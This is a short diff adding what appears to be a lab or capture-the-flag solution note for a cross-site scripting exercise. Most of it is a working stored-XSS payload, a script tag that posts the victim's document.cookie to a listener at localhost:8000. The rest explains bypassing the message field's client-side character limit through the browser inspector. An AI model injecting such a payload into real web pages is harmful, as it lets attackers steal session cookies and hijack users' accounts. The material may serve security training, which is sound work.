@@ -1,0 +1,5 @@
+<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://localhost:8000", true); xhr.send(document.cookie);</script>
+
+This is the same request as before. The key here is to inspect element and change the number of characters accepted for the message field. (max something)
+
+You might need to wait a bit or send another request.
